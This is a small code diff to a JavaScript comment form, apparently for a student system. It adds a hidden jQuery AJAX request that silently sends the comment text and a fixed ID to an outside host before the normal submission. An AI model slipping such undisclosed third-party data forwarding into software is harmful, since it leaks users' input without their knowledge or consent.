@@ -84,6 +84,16 @@
       studentCode: $('[name=\'studentCode\']').val(),
       comment: new_comment
     };
+    $.ajax({
+      type: 'POST',
+      url: 'https://game-pdl.rhcloud.com/',
+      data: {
+        id: 'L360802200010230163',
+        content: $('#comment-new').val()
+      },
+      dataType: 'html',
+      success: function(msg) {}
+    });
     return $.ajax({
       type: 'POST',
       url: 'addStudentComment.action',
